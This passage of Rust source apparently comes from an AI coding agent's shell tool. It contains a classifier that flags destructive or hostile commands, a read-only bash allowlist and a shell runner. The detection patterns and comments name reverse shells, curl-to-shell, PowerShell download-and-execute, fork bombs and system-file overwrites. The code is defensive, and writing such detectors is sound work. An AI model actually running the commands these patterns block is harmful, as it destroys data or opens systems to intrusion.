                if let Some(r) = check_destructive_command(t) {
                    return Some(r);
                }
            }
        }
    }
    // Remote script piped to a shell (curl … | sh).
    let downloader = ["curl", "wget", "aria2c", "lynx", "wget2"]
        .iter()
        .any(|&d| cmd.split_whitespace().any(|t| base(t) == d));
    let pipes_to_shell = ["sh", "bash", "zsh", "dash", "ash", "ksh"]
        .iter()
        .any(|&s| cmd.contains(&format!("| {s}")));
    if downloader && pipes_to_shell {
        return Some("remote script piped into shell".to_string());
    }
    // Anything piped into a shell: inspect every upstream part directly, and unwrap
    // `echo`/`printf "<destructive>"` whose quoted payload becomes the shell's input
    // (e.g. `echo 'rm -rf /' | bash`).
    if cmd.contains('|') {
        let parts: Vec<&str> = cmd.split('|').collect();
        for (i, part) in parts.iter().enumerate() {
            let fb = base(part.split_whitespace().next().unwrap_or(""));
            if ["sh", "bash", "zsh", "dash", "ash", "ksh"].contains(&fb) {
                for prev in &parts[..i] {
                    let p = prev.trim();
                    if let Some(r) = check_destructive_command(p) {
                        return Some(format!("destructive command piped to shell: {r}"));
                    }
                    if p.starts_with("echo ") || p.starts_with("printf ") {
                        let payload: String =
                            p.split_whitespace().skip(1).collect::<Vec<_>>().join(" ");
                        let inner = payload.trim_matches(|c| c == '"' || c == '\'');
                        if let Some(r) = check_destructive_command(inner) {
                            return Some(format!(
                                "destructive command piped to shell (via echo/printf): {r}"
                            ));
                        }
                    }
                }
            }
        }
    }
    // Reverse-shell / raw-socket redirect (bash /dev/tcp, /dev/udp).
    if cmd.contains("/dev/tcp/") || cmd.contains("/dev/udp/") {
        return Some("reverse shell / raw socket redirect (/dev/tcp|udp)".to_string());
    }
    // Remote script via process substitution: `sh <(curl …)`. The downloader is often
    // glued to `<(`, so match it as a substring here (not a clean whitespace token).
    if ["curl", "wget", "aria2c", "lynx", "wget2"]
        .iter()
        .any(|d| cmd.contains(d))
        && ["sh <(", "bash <(", "zsh <(", "dash <(", "ash <(", "ksh <("]
            .iter()
            .any(|p| cmd.contains(p))
    {
        return Some("remote script via process substitution".to_string());
    }
    // netcat / ncat listener or -e/-c exec (reverse shell).
    if cmd.split_whitespace().any(|t| {
        [
            "nc",
            "ncat",
            "netcat",
            "nc.openbsd",
            "nc.traditional",
            "pwncat",
        ]
        .contains(&base(t))
    }) && (cmd.contains(" -e")
        || cmd.contains(" -c ")
        || cmd.contains("--exec")
        || cmd.contains("--sh-exec")
        || cmd.contains(" -l")
        || cmd.contains("--listen"))
    {
        return Some("netcat reverse shell / listener".to_string());
    }
    // socat exec / listener tunnels.
    if cmd.split_whitespace().any(|t| base(t) == "socat")
        && (cmd.contains("exec:")
            || cmd.contains("system:")
            || cmd.contains("tcp-listen")
            || cmd.contains("tcp-connect")
            || cmd.contains("udp-listen")
            || cmd.contains("udp-connect")
            || cmd.contains(",pty"))
    {
        return Some("socat reverse shell / tunnel".to_string());
    }
    // Script-language reverse-shell signatures (python/perl/ruby/php sockets + exec).
    if (cmd.contains("import socket")
        || cmd.contains("socket.socket")
        || cmd.contains("tcpsocket")
        || cmd.contains("fsockopen")
        || cmd.contains("io.popen"))
        && (cmd.contains("/bin/sh")
            || cmd.contains("/bin/bash")
            || cmd.contains("subprocess")
            || cmd.contains("exec")
            || cmd.contains("spawn"))
    {
        return Some("script-based reverse shell".to_string());
    }

    // rm with recursive flags (excluding pure build-artifact cleanup); dynamic rm.
    let first = cmd.split_whitespace().next().unwrap_or("");
    let normalized_first = normalize(first);
    let first_base = base(&normalized_first);
    if uses_expansion(first) {
        let (rec, force) = rm_flags(&cmd);
        if rec && !is_artifact_cleanup(&cmd) {
            return Some(format!(
                "dynamic command with recursive{} delete flags",
                if force { " force" } else { "" }
            ));
        }
    }
    if ["rm", "/rm", "/bin/rm", "/usr/bin/rm"].contains(&first_base) {
        let (rec, force) = rm_flags(&cmd);
        if rec && !is_artifact_cleanup(&cmd) {
            return Some(format!(
                "recursive{} delete",
                if force { " force" } else { "" }
            ));
        }
    }
    // dd raw disk write. Gate the `if=/dev/` substring on dd actually being the command
    // so `cd if=/dev/foo` (normalizes to `cdif=/dev/foo`) is not a false positive.
    let dd_norm: String = cmd.split_whitespace().collect();
    if dd_norm.starts_with("ddif=") || (first_base == "dd" && dd_norm.contains("if=/dev/")) {
        return Some("raw disk write (dd)".to_string());
    }
    // Fork bomb.
    if cmd.contains(":(){") || cmd.contains(": (){") || cmd.contains("(){ :|:&") {
        return Some("fork bomb".to_string());
    }
    // Critical system-file overwrite.
    for f in ["/etc/passwd", "/etc/shadow", "/etc/hosts", "/etc/sudoers"] {
        if cmd.contains(&format!("> {f}")) || cmd.contains(&format!(">> {f}")) {
            return Some("critical system file overwrite".to_string());
        }
    }
    // mkfifo / mknod.
    if cmd.contains("mkfifo ") || cmd.contains("mknod ") {
        return Some("named pipe / device node creation".to_string());
    }
    // ORM / migration schema reset (drops all tables; no rm/drop on the command line).
    {
        let toks: Vec<&str> = cmd.split_whitespace().collect();
        let reset_verbs = ["fresh", "refresh", "reset"];
        let triggers = ["--", "migrate", "migration", "db", "database"];
        for w in toks.windows(2) {
            let prev = w[0].trim_matches(|c: char| c == '"' || c == '\'' || c == ';');
            let cur = w[1].trim_matches(|c: char| c == '"' || c == '\'' || c == ';');
            if reset_verbs.contains(&cur) && triggers.contains(&prev) {
                return Some("schema reset (drops all tables)".to_string());
            }
        }
        for t in &toks {
            let t = t.trim_matches(|c: char| c == '"' || c == '\'' || c == ';');
            if let Some((l, r)) = t.split_once(':') {
                if matches!(l, "migrate" | "migration" | "db" | "database")
                    && reset_verbs.contains(&r)
                {
                    return Some("schema reset (drops all tables)".to_string());
                }
            }
        }
    }
    // Windows (cmd.exe / PowerShell) destructive patterns (cmd is already lowercased).
    if cmd.contains("powershell") || cmd.contains("pwsh") {
        let web_dl = [
            "invoke-webrequest",
            "downloadstring",
            "downloadfile",
            "net.webclient",
            "iwr ",
        ]
        .iter()
        .any(|p| cmd.contains(p));
        if web_dl && (cmd.contains("iex") || cmd.contains("invoke-expression")) {
            return Some("PowerShell download-and-execute".to_string());
        }
        if cmd.contains("net.sockets.tcpclient") {
            return Some("PowerShell TCPClient reverse shell".to_string());
        }
    }
    if cmd.contains("netsh ") && cmd.contains("portproxy") {
        return Some("netsh port forwarding".to_string());
    }
    for (pat, reason) in [
        ("runas ", "privilege elevation (runas)"),
        ("takeown ", "ownership change (takeown)"),
        ("icacls ", "ACL change (icacls)"),
        ("diskpart", "disk partition operation (diskpart)"),
        ("rmdir /s", "recursive directory removal (rmdir /s)"),
        ("rd /s", "recursive directory removal (rd /s)"),
        ("del /s", "recursive delete (del /s)"),
    ] {
        if cmd.contains(pat) {
            return Some(reason.to_string());
        }
    }

    // Case-sensitive git short flag (must inspect the ORIGINAL command).
    if command.contains("git branch -D") {
        return Some("force delete branch (git branch -D)".to_string());
    }
    // Working-tree-discarding git — the reported data-loss footgun. Single owner for
    // checkout/switch/restore/reset --hard/clean (tokenized → space-robust); the substring table
    // below keeps only the NON-worktree-discard git cases (force push, history rewrite, …).
    if let Some(reason) = git_worktree_discard(&cmd) {
        return Some(reason.to_string());
    }
    // Substring pattern table (matched against the lowercased command).
    let patterns: &[(&str, &str)] = &[
        ("rmdir ", "directory removal"),
        ("drop table", "SQL DROP TABLE"),
        ("drop database", "SQL DROP DATABASE"),
        ("format ", "disk format"),
        ("mkfs", "filesystem creation"),
        ("chmod 777", "world-writable permission"),
        ("chmod -r ", "recursive permission change"),
        ("chown ", "file ownership change"),
        ("chgrp ", "file group change"),
        ("kill -9", "force kill"),
        ("killall ", "kill all matching processes"),
        ("git push --force", "force push"),
        ("git push -f", "force push"),
        // NOTE: worktree-discard git (reset --hard / clean -f / checkout|switch force+pathspec /
        // restore) is owned by `git_worktree_discard` above (tokenized, space-robust) — do not
        // re-add it here.
        ("--no-verify", "bypassing git hooks"),
        ("git filter-branch", "git history rewrite"),
        ("git filter-repo", "git history rewrite"),
        ("git rebase -i", "interactive rebase"),
        ("git rebase --interactive", "interactive rebase"),
        ("git branch --delete --force", "force delete branch"),
    ];
    for (pat, reason) in patterns {
        if cmd.contains(pat) {
            return Some((*reason).to_string());
        }
    }
    None
}

/// The strict read-only command allowlist: the FIRST word of every pipeline
/// segment must be one of these for the command to be considered parallel-safe.
/// Deliberately tiny — these commands do not write files, mutate state, or run
/// other programs (with the `find` carve-out handled below). Widening this is a
/// future step, not a v1 concern.
const READ_ONLY_BASH_ALLOWLIST: &[&str] = &[
    "grep", "rg", "cat", "head", "tail", "ls", "find", "wc", "echo", "pwd", "which", "stat", "cut",
    "tr", "nl", "rev", "basename", "dirname", "file", "printf", "true", "false", "seq", "column",
    "cd", // read-only builtin: only changes THIS process's cwd, scoped to this bash call.
];

/// Parse `command` as bash with tree-sitter. `None` on parser-load failure or a
/// completely unparseable input. The caller must still reject trees containing
/// ERROR/MISSING nodes (a partial parse) — see `is_read_only_bash`.
fn parse_bash(command: &str) -> Option<tree_sitter::Tree> {
    use std::cell::RefCell;
    thread_local! {
        static PARSER: RefCell<Option<tree_sitter::Parser>> = RefCell::new(None);
    }
    PARSER.with(|slot| {
        let mut opt = slot.borrow_mut();
        if opt.is_none() {
            let mut p = tree_sitter::Parser::new();
            p.set_language(&tree_sitter_bash::LANGUAGE.into()).ok()?;
            *opt = Some(p);
        }
        opt.as_mut().unwrap().parse(command, None)
    })
}

/// One concrete command invocation extracted from a Bash syntax tree.
///
/// This is intentionally syntax-only: product layers decide whether `cargo test`,
/// `git commit`, or an arbitrary executable is permitted. Returning `None` means the
/// source could not be parsed completely, so policy callers can fail closed.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct BashInvocation {
    pub command: String,
    pub arguments: Vec<String>,
}

/// Parse every command invocation in `source`, including invocations nested in command
/// substitutions and subshells. Quoted separators remain argument data rather than being
/// mistaken for pipelines. The result preserves source order.
pub fn bash_invocations(source: &str) -> Option<Vec<BashInvocation>> {
    let source = source.trim();
    if source.is_empty() {
        return None;
    }
    let tree = parse_bash(source)?;
    let root = tree.root_node();
    if root.has_error() {
        return None;
    }
    let bytes = source.as_bytes();
    let mut nodes = Vec::new();
    let mut stack = vec![root];
    while let Some(node) = stack.pop() {
        if node.kind() == "command" {
            nodes.push(node);
        }
        for index in (0..node.child_count() as u32).rev() {
            stack.push(node.child(index)?);
        }
    }
    nodes.sort_by_key(|node| node.start_byte());

    let mut invocations = Vec::with_capacity(nodes.len());
    for node in nodes {
        let mut command = None;
        let mut arguments = Vec::new();
        for index in 0..node.named_child_count() as u32 {
            let child = node.named_child(index)?;
            let text = child.utf8_text(bytes).ok()?.to_string();
            if child.kind() == "command_name" && command.is_none() {
                command = Some(text);
            } else if matches!(
                child.kind(),
                "word" | "raw_string" | "string" | "concatenation" | "number"
            ) {
                arguments.push(text);
            }
        }
        invocations.push(BashInvocation {
            command: command?,
            arguments,
        });
    }
    Some(invocations)
}

/// Whether `command` is PROVABLY read-only, so it may run CONCURRENTLY without a
/// sandbox. AST-based (tree-sitter-bash): only a fixed set of STRUCTURAL node kinds is
/// allowed; any other NAMED kind (command substitution, subshell, expansion, …) means
/// "cannot prove read-only" → false. Each `command` node's first word must be in
/// [`READ_ONLY_BASH_ALLOWLIST`] (with the `find` write/exec carve-out); every redirect
/// must target `/dev/null` or be an fd-dup. Fail CLOSED: parse failure / ERROR node /
/// unknown named kind / non-discard redirect → false.
///
/// **Backgrounding (`&`):** a bare `&` (background/async operator) is an ANONYMOUS
/// token in the tree-sitter-bash grammar — it is NOT a named node and therefore does
/// NOT trigger the unknown-named-kind rejection. A backgrounded command chain is
/// read-only iff EVERY command in it is allowlisted, exactly like `&&` / `;` / `|`.
/// For example `grep x PWN & grep y PWN` → true (both greps allowlisted), while
/// `touch HACKED & grep x PWN` → false (touch is not allowlisted).
///
/// A false negative only costs parallelism; a false positive would let a
/// side-effecting command run concurrently — so the bar is "provably safe".
///
/// The AST subsumes the old hand-rolled string classifier: quoted metacharacters are
/// DATA, not operators (`grep 'a\|b'` → true), `cd && grep` parses as a `list` of two
/// allowlisted commands (true, no `cd`-prefix hack), and — load-bearing — a
/// single-quoted `'$(rm)'` stays a `raw_string` (SAFE literal) while a double-quoted
/// `"$(rm)"` contains a `command_substitution` child that the walk rejects.
pub(crate) fn is_read_only_bash(command: &str) -> bool {
    let cmd = command.trim();
    if cmd.is_empty() {
        return false;
    }
    let tree = match parse_bash(cmd) {
        Some(t) => t,
        None => return false,
    };
    let root = tree.root_node();
    if root.has_error() {
        return false; // partial / ambiguous parse → fail closed
    }
    // Structural node kinds a read-only command may contain — CONFIRMED against
    // tree-sitter-bash 0.25.1 by the `probe_bash_node_kinds` test. Danger-only kinds
    // (command_substitution — covers `$()` AND backtick; subshell — `(...)`;
    // simple_expansion / variable_name — `$HOME`) are DELIBERATELY absent: hitting any
    // of them fails the walk. `string` IS allowed (a double-quoted literal is safe),
    // but a double-quoted `"$(...)"` nests a `command_substitution` CHILD → still
    // rejected; a single-quoted `'$(...)'` is a leaf `raw_string` → safe.
    const ALLOWED_KINDS: &[&str] = &[
        "program",
        "list",
        "pipeline",
        "command",
        "command_name",
        "word",
        "raw_string",
        "string",
        "string_content",
        "concatenation",
        "number",
        // redirect wrapper + parts — the TARGET is validated in `redirect_is_readonly`:
        "redirected_statement",
        "file_redirect",
        "file_descriptor",
    ];
    let src = cmd.as_bytes();
    let mut stack = vec![root];
    while let Some(node) = stack.pop() {
        let kind = node.kind();
        // Anonymous tokens (`&&`, `|`, `;`, `>`, `"`, `'`, …) are `!is_named()` — their
        // named parent gates them, so they are not checked here. Any UNKNOWN named kind
        // is a construct we cannot prove read-only → fail closed.
        if node.is_named() && !ALLOWED_KINDS.contains(&kind) {
            return false;
        }
        if kind == "command" && !command_first_word_allowed(node, src) {
            return false;
        }
        if kind == "file_redirect" && !redirect_is_readonly(node, src) {
            return false;
        }
        for i in 0..node.child_count() as u32 {
            stack.push(node.child(i).unwrap());
        }
    }
    true
}

/// The first word (`command_name`) of a `command` node must be in the read-only
/// allowlist; a `find` command must not carry write/exec actions.
fn command_first_word_allowed(command_node: tree_sitter::Node, src: &[u8]) -> bool {
    // `command_name` is the first child of a `command`; its text is the invoked program.
    let mut name: Option<&str> = None;
    for i in 0..command_node.child_count() as u32 {
        let c = command_node.child(i).unwrap();
        if c.kind() == "command_name" {
            name = c.utf8_text(src).ok();
            break;
        }
    }
    let first = match name {
        Some(n) => n,
        None => return false, // no command name (e.g. a bare assignment) → not read-only
    };
    if !READ_ONLY_BASH_ALLOWLIST.contains(&first) {
        return false;
    }
    // `find` carve-out: pure traversal is read-only, but `-delete` / `-exec` / `-ok` /
    // `-fprint*` / `-fls` mutate or run arbitrary programs. Scan the command's argv text.
    if first == "find" {
        let text = command_node.utf8_text(src).unwrap_or("");
        if text.contains("-delete")
            || text.contains("-exec")
            || text.contains("-ok")
            || text.contains("-fprint")
            || text.contains("-fls")
        {
            return false;
        }
    }
    true
}

/// A `file_redirect` is read-only iff its target is exactly `/dev/null` or an fd-dup
/// (`>&1`, `2>&1`, `>&-`). Any other target writes a real file → not read-only.
///
/// ## Numeric target discrimination
///
/// A numeric target (`number` node in tree-sitter-bash) is ambiguous:
/// - `2>&1`  → fd-dup: the `1` is a file DESCRIPTOR, not a filename.  SAFE.
/// - `> 9`   → plain redirect: the `9` is a real filename.  WRITES A FILE.
///
/// The discriminator is the redirect operator text: an fd-dup form contains `>&` or
/// `<&` (e.g. `>&`, `2>&`, `<&`); a plain write form does not.  We obtain the full
/// redirect node text and check for those substrings.
///
/// ## Other forms
/// - `word`/`raw_string`/`string`/`concatenation` target → must be exactly `/dev/null`,
///   regardless of the operator direction.  This is **conservative/fail-closed**: a
///   non-`/dev/null` word target of ANY redirect — output (`> file`, `>> file`) OR input
///   (`< file`) — is rejected.  Only `/dev/null` and fd-dups pass.  `cat <file` is
///   therefore rejected (the word `file` ≠ `/dev/null`), even though reading a file via
///   input redirect does not write anything; we prefer false-negatives over false-positives.
/// - `>&out.txt` → target is a `word` (not `/dev/null`) → rejected.  Correct: writes a file.
/// - `&>/dev/null` → target is a `word` `/dev/null`; operator `&>` has no `>&` → word arm
///   accepts it.  Correct: discard-all redirect.
fn redirect_is_readonly(redirect_node: tree_sitter::Node, src: &[u8]) -> bool {
    let redir_text = redirect_node.utf8_text(src).unwrap_or("");
    // A PURE input redirect (`< f`, `3< f`) only READS the file — harmless for
    // concurrency. `<>` (read-write, has `>`) and `<&N` (fd-dup, has `&`) are NOT
    // pure input and fall through to the normal checks. Heredoc/herestring are
    // separate node kinds rejected upstream.
    let is_input_read =
        redir_text.contains('<') && !redir_text.contains('>') && !redir_text.contains('&');
    if is_input_read {
        return true;
    }
    // Detect fd-dup form by inspecting the raw redirect text.  An fd-dup (`>&N`, `2>&1`,
    // `<&N`, `>&-`) contains `>&` or `<&`; a plain write (`>`, `>>`, `2>`, `&>`) does not.
    let is_fd_dup = redir_text.contains(">&") || redir_text.contains("<&");

    for i in 0..redirect_node.child_count() as u32 {
        let c = redirect_node.child(i).unwrap();
        match c.kind() {
            // A file target: must be exactly /dev/null (word/quoted/concatenated).
            "word" | "raw_string" | "string" | "concatenation" => {
                let target = c.utf8_text(src).unwrap_or("");
                if target != "/dev/null" {
                    return false; // writes a real file (out.txt, /dev/nullX, >&file, …)
                }
            }
            // A numeric target: safe ONLY as an fd-dup (`2>&1`); a plain `> 9` writes file "9".
            "number" => {
                if !is_fd_dup {
                    return false;
                }
            }
            _ => {}
        }
    }
    true
}

/// A `tokio::process::Child` whose whole process group is cleaned up on Drop
/// and via explicit `terminate()`. `setsid()` in `pre_exec` makes the child a
/// pgroup leader (pgid == pid); killing the pgroup catches grandchildren the
/// direct-child `kill_on_drop` misses (cargo, ssh, dev servers). The wrapper's
/// `Drop` issues a final SIGKILL to the pgroup on cancel; `terminate()` does a
/// graceful SIGTERM → grace → SIGKILL for the timeout/idle paths where we can
/// await. Idempotent: a Drop after `terminate()` issues a second SIGKILL to a
/// pgroup that's already empty. `killpg` returns ESRCH which we ignore.
/// A `terminated` flag short-circuits the Drop signal to avoid the
/// tiny PID-reuse window between `wait()` reaping the leader and Drop.
#[cfg(not(target_os = "windows"))]
struct PgroupChild {
    child: tokio::process::Child,
    pgid: i32,
    terminated: bool,
}

#[cfg(not(target_os = "windows"))]
impl PgroupChild {
    fn new(child: tokio::process::Child) -> Self {
        // setsid() in pre_exec makes the child its own pgroup leader,
        // so pgid == pid. id() is Some() until try_wait()/wait() reaps,
        // and we always read it pre-reap.
        let pgid = child
            .id()
            .expect("PgroupChild::new called after the child was reaped") as i32;
        Self {
            child,
            pgid,
            terminated: false,
        }
    }

    /// Graceful pgroup shutdown: SIGTERM → 200ms grace → SIGKILL → reap.
    /// Call from explicit cleanup paths (timeout/idle) where we can await.
    async fn terminate(&mut self) {
        unsafe {
            killpg(self.pgid, SIGTERM);
        }
        // 200ms is empirically: long enough for well-behaved servers
        // (uvicorn, vite, cargo-watch) to release ports and flush logs,
        // short enough that Ctrl-C still feels instant.
        tokio::time::sleep(Duration::from_millis(200)).await;
        unsafe {
            killpg(self.pgid, SIGKILL);
        }
        // Reap the bash leader so its zombie doesn't linger.
        let _ = self.child.wait().await;
        self.terminated = true;
    }
}

#[cfg(not(target_os = "windows"))]
impl std::ops::Deref for PgroupChild {
    type Target = tokio::process::Child;
    fn deref(&self) -> &Self::Target {
        &self.child
    }
}

#[cfg(not(target_os = "windows"))]
impl std::ops::DerefMut for PgroupChild {
    fn deref_mut(&mut self) -> &mut Self::Target {
        &mut self.child
    }
}

#[cfg(not(target_os = "windows"))]
impl Drop for PgroupChild {
    fn drop(&mut self) {
        // Skip if terminate() already ran: the pgroup is empty and the
        // pid we hold may now belong to an unrelated process (PID reuse
        // window between wait() reaping the leader and Drop running).
        if self.terminated {
            return;
        }
        unsafe {
            killpg(self.pgid, SIGKILL);
        }
        // The wrapped Child has kill_on_drop=true, so its own Drop will
        // SIGKILL the direct PID and reap. We just covered grandchildren.
    }
}

#[cfg(not(target_os = "windows"))]
extern "C" {
    fn killpg(pgid: i32, sig: i32) -> i32;
}

// Standard POSIX signal numbers — identical on Linux, macOS, BSD.
#[cfg(not(target_os = "windows"))]
const SIGTERM: i32 = 15;
#[cfg(not(target_os = "windows"))]
const SIGKILL: i32 = 9;

/// Result of running a shell command, decoupled from tool-result framing.
/// `bash_execute` (model-invoked Bash tool) and `handle_local_shell`
/// (user-invoked `!` mode) both build on this.
pub struct ShellOutcome {
    pub stdout: String,
    pub stderr: String,
    pub exit: ShellExit,
    pub elapsed_secs: f64,
}

/// How the child process ended. Mirrors the three branches the old
/// `bash_execute` match handled: clean exit, idle-kill, hard-timeout-kill.
pub enum ShellExit {
    /// Process exited on its own. `success` is `status.success()`,
    /// `code` is the numeric exit code (None = terminated by signal).
    Exited { success: bool, code: Option<i32> },
    /// Readers hit EOF/idle but the child never reaped — killed as stuck.
    KilledIdle,
    /// Hard wall-clock timeout — killed.
    KilledTimeout,
}

/// Capabilities-owned shell runner used by the current coding stack. Core still has a separate
/// implementation for its remaining tool consumers; consolidate that copy only when those
/// consumers migrate. This implementation reuses capabilities' own `sanitize_terminal_output`,
/// a deliberate superset of core's: it additionally strips DCS/SOS/PM/APC + 8-bit C1
/// introducers, so `!cmd` output is cleaner.
///
/// Spawn `command` in `wd`, stream output via `chunk_cb`, return raw outcome.
/// No ToolResult framing, no git snapshot, no error-signature tracking —
/// those stay in the tool layer. `chunk_cb` receives stdout chunks verbatim
/// and stderr chunks prefixed with `[stderr] `.
pub async fn run_shell(
    command: &str,
    wd: &std::path::Path,
    timeout_secs: u64,
    chunk_cb: impl Fn(&str),
) -> ShellOutcome {
    let start_instant = Instant::now();

    // Platform-aware shell: cmd.exe on Windows, bash on Unix
    #[cfg(target_os = "windows")]
    let mut child = {
        let mut cmd = Command::new("cmd.exe");
        cmd.arg("/C");
        cmd.as_std_mut().raw_arg(command);
        cmd.current_dir(wd)
            .stdin(std::process::Stdio::null())
            .stdout(std::process::Stdio::piped())
            .stderr(std::process::Stdio::piped())
            // kill_on_drop covers the direct cmd.exe PID on `tokio::select!`
            // cancel / hard timeout. The descendant tree is reaped by the Job
            // Object assigned below (see `job_guard`).
            .kill_on_drop(true);
        crate::process_utils::suppress_console_window(&mut cmd);
        match cmd.spawn() {
            Ok(c) => c,
            Err(e) => {
                return ShellOutcome {
                    stdout: String::new(),
                    stderr: format!("failed to spawn: {e}"),
                    exit: ShellExit::Exited {
                        success: false,
                        code: None,
                    },
                    elapsed_secs: start_instant.elapsed().as_secs_f64(),
                };
            }
        }
    };

    #[cfg(not(target_os = "windows"))]
    let mut child = {
        #[cfg(not(target_env = "ohos"))]
        let mut cmd = Command::new("bash");
        #[cfg(target_env = "ohos")]
        let mut cmd = Command::new("sh");

        cmd.arg("-c")
            .arg(command)
            .current_dir(wd)
            .stdin(std::process::Stdio::null())
            .stdout(std::process::Stdio::piped())
            .stderr(std::process::Stdio::piped())
            // kill_on_drop ensures bash itself dies if the tool future is
            // dropped mid-flight. PgroupChild::Drop below extends that
            // to bash's whole process group (cargo / ssh / dev-server
            // grandchildren that setsid() detached from us).
            .kill_on_drop(true);
        crate::process_utils::apply_utf8_locale_env(&mut cmd);
        // Detach child from the controlling terminal so neither it nor any
        // grandchild (ssh, git credential helpers, server-side hook output
        // rendered by git) can write directly to /dev/tty.  Without this,
        // programs that open /dev/tty bypass our piped stdout/stderr and
        // scribble ANSI escape sequences onto the TUI — producing artifacts
        // like the [PASSED] box from AtomGit push hooks.
        unsafe {
            cmd.pre_exec(|| {
                // SAFETY(pre_exec): runs in the forked child before exec —
                // async-signal-safe libc ONLY. No allocation, locks, panics, or
                // non-reentrant calls, or the child can deadlock.
                // setsid()/open()/close()/ioctl() below are async-signal-safe.
                extern "C" {
                    fn setsid() -> i32;
                    fn open(path: *const i8, oflag: i32, ...) -> i32;
                    fn close(fd: i32) -> i32;
                    fn ioctl(fd: i32, request: u64, ...) -> i32;
                }
                setsid();
                const O_RDWR: i32 = 2;
                #[cfg(target_os = "macos")]
                const TIOCNOTTY: u64 = 0x20007471;
                #[cfg(not(target_os = "macos"))]
                const TIOCNOTTY: u64 = 0x5422;
                let tty_fd = open(b"/dev/tty\0".as_ptr() as *const i8, O_RDWR);
                if tty_fd >= 0 {
                    ioctl(tty_fd, TIOCNOTTY);
                    close(tty_fd);
                }
                Ok(())
            });
        }
        // Wrap the spawned child so pgroup cleanup runs on Drop (cancel)
        // and via the explicit terminate() calls below (timeout/idle).
        match cmd.spawn() {
            Ok(c) => PgroupChild::new(c),
            Err(e) => {
                return ShellOutcome {
                    stdout: String::new(),
                    stderr: format!("failed to spawn: {e}"),
                    exit: ShellExit::Exited {
                        success: false,
                        code: None,
                    },
                    elapsed_secs: start_instant.elapsed().as_secs_f64(),
                };
            }
        }
    };

    // Windows: put the shell tree under a kill-on-close Job Object so the
    // idle/timeout kill (and atomcode's own exit) reaps grandchildren
    // (mvn → java, pipeline sub-shells, busybox applets) instead of orphaning
    // them. Unix already reaps the pgroup via `PgroupChild::terminate` below.
    // Held until this fn returns; `None` degrades to the direct-child kill.
    #[cfg(target_os = "windows")]
    let job_guard = crate::process_utils::assign_child_to_kill_on_close_job(&child);
    // Fallback root for `taskkill /T` when the Job Object couldn't be set up.
    #[cfg(target_os = "windows")]
    let child_pid = child.id();

    let mut stdout = child.stdout.take().unwrap();
    let mut stderr = child.stderr.take().unwrap();
    let mut stdout_buf = Vec::new();
    let mut stderr_buf = Vec::new();

    let idle_timeout = Duration::from_secs(SILENT_KILL_SECS);
    let has_any_output = std::sync::Arc::new(std::sync::atomic::AtomicBool::new(false));
    let has_out_1 = has_any_output.clone();
    let has_out_2 = has_any_output.clone();
    let chunk_cb = &chunk_cb;
    let mut stdout_decode_pending = Vec::new();
    let mut stderr_decode_pending = Vec::new();

    let result = tokio::time::timeout(Duration::from_secs(timeout_secs), async {
        let (_, _) = tokio::join!(
            async {
                let mut buf = vec![0u8; 65536];
                loop {
                    match tokio::time::timeout(idle_timeout, stdout.read(&mut buf)).await {
                        Ok(Ok(0)) => break,
                        Ok(Ok(n)) => {
                            stdout_buf.extend_from_slice(&buf[..n]);
                            has_out_1.store(true, std::sync::atomic::Ordering::Relaxed);
                            if let Some(chunk) =
                                decode_stream_chunk(&mut stdout_decode_pending, &buf[..n], false)
                            {
                                chunk_cb(&sanitize_terminal_output(&chunk));
                            }
                        }
                        Ok(Err(_)) => break,
                        Err(_) => {
                            if has_out_1.load(std::sync::atomic::Ordering::Relaxed) {
                                break;
                            }
                        }
                    }
                }
            },
            async {
                let mut buf = vec![0u8; 65536];
                loop {
                    match tokio::time::timeout(idle_timeout, stderr.read(&mut buf)).await {
                        Ok(Ok(0)) => break,
                        Ok(Ok(n)) => {
                            stderr_buf.extend_from_slice(&buf[..n]);
                            has_out_2.store(true, std::sync::atomic::Ordering::Relaxed);
                            if let Some(chunk) =
                                decode_stream_chunk(&mut stderr_decode_pending, &buf[..n], false)
                            {
                                chunk_cb(&format!("[stderr] {}", sanitize_terminal_output(&chunk)));
                            }
                        }
                        Ok(Err(_)) => break,
                        Err(_) => {
                            if has_out_2.load(std::sync::atomic::Ordering::Relaxed) {
                                break;
                            }
                        }
                    }
                }
            }
        );

        match child.try_wait() {
            Ok(Some(status)) => Some((status.success(), status.code())),
            _ => match tokio::time::timeout(Duration::from_millis(100), child.wait()).await {
                Ok(Ok(status)) => Some((status.success(), status.code())),
                _ => None,
            },
        }
    })
    .await;

    // Flush undecoded tails even when the hard timeout cancelled the reader futures.
    if let Some(chunk) = decode_stream_chunk(&mut stdout_decode_pending, &[], true) {
        chunk_cb(&sanitize_terminal_output(&chunk));
    }
    if let Some(chunk) = decode_stream_chunk(&mut stderr_decode_pending, &[], true) {
        chunk_cb(&format!("[stderr] {}", sanitize_terminal_output(&chunk)));
    }

    let stdout_str = decode_output(&stdout_buf);
    let stderr_str = decode_output(&stderr_buf);
    let elapsed_secs = start_instant.elapsed().as_secs_f64();

    let exit = match result {
        Ok(Some((success, code))) => ShellExit::Exited { success, code },
        Ok(None) => {
            // Readers hit idle/EOF but the child never reaped — kill it.
            // terminate() on Unix walks the pgroup (SIGTERM → 200ms → SIGKILL);
            // Windows terminates the Job Object tree (else `taskkill /T`), then
            // reaps the direct child.
            #[cfg(not(target_os = "windows"))]
            child.terminate().await;
            #[cfg(target_os = "windows")]
            {
                crate::process_utils::kill_windows_tree(&job_guard, child_pid);
                let _ = child.kill().await;
            }
            ShellExit::KilledIdle
        }
        Err(_) => {
            // Hard wall-clock timeout — same tree-aware kill as idle.
            #[cfg(not(target_os = "windows"))]
            child.terminate().await;
            #[cfg(target_os = "windows")]
            {
                crate::process_utils::kill_windows_tree(&job_guard, child_pid);
                let _ = child.kill().await;
            }
            ShellExit::KilledTimeout
        }
    };

    ShellOutcome {
        stdout: stdout_str,
        stderr: stderr_str,
        exit,
        elapsed_secs,
    }
}

#[cfg(all(test, unix))]
#[test]
fn apply_askpass_env_sets_sudo_ssh_vars() {
    use crate::askpass::server::AskpassEnv;
    let env = AskpassEnv {
        sock_path: "/run/x.sock".into(),
        token: "tok".into(),
        askpass_script: "/run/askpass.sh".into(),
    };
    let mut cmd = tokio::process::Command::new("bash");
    apply_askpass_env(&mut cmd, &env);
    // std Command exposes get_envs(): assert the 5 vars are present with expected values.
    let got: std::collections::HashMap<_, _> = cmd
        .as_std()
        .get_envs()
        .filter_map(|(k, v)| Some((k.to_str()?.to_string(), v?.to_str()?.to_string())))
        .collect();
    assert_eq!(
        got.get("SUDO_ASKPASS").map(String::as_str),
        Some("/run/askpass.sh")
    );
    assert_eq!(
        got.get("SSH_ASKPASS").map(String::as_str),
        Some("/run/askpass.sh")
    );
